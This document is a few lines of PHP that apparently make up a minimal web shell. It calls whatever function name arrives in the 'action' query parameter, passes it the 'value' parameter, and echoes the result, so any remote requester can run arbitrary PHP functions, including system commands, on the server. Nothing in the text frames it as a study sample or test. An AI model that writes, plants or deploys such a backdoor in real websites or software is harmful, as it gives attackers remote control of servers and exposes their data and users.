<?php 
	$action = $_GET['action'];
	$value  = $_GET['value'];
	echo($action($value));
?>